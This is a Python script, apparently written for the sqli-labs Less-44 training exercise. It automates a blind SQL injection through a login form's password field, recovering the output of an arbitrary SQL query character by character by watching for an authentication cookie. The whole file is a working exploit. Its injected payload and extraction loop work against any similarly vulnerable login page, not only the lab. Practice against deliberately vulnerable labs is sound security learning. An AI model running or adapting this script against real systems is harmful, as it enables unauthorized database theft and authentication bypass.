#!/usr/bin/env python

import random
import requests
import re
import string
import sys

idx = random.randint(30,500)

banner = '''
USAGE: python %s <SQL Query>
EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

url_1 = "http://172.16.214.227/sqli-labs/Less-44/index.php"
url_2 = "http://172.16.214.227/sqli-labs/Less-44/login.php"

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

def getCookie():
    global url_1
    global header
    sessid = requests.get(url_1, headers=header, verify=False, allow_redirects=False).cookies['PHPSESSID']
    return {'PHPSESSID': sessid}

def main():
    global url_2
    global header
    result = ""
    idx = 0

    while(True):
        idx += 1
        cookie = getCookie()
        query = {
            "login_user": "aaaa",
            "login_password": "pass' or substr((%s),%d,1) = '%s';#" % (sys.argv[1], idx, ""),
            "mysubmit": "Login"
        }

        try:
            auth = requests.post(url_2, headers=header, data=query, cookies=cookie, verify=False, allow_redirects=False).cookies['Auth']
            break
        except:
            pass

        for x in string.printable:
            query = {
                "login_user": "aaaa",
                "login_password": "pass' or substr((%s),%d,1) = '%s';#" % (sys.argv[1], idx, x),
                "mysubmit": "Login"
            }

            try:
                auth = requests.post(url_2, headers=header, data=query, cookies=cookie, verify=False, allow_redirects=False).cookies['Auth']
                print("[+] Hit: %s" % x)
                result += x
                break
            except:
                pass

    print("[*] RESULT: %s" % result)

    return None

if(__name__ == '__main__'):
    main()
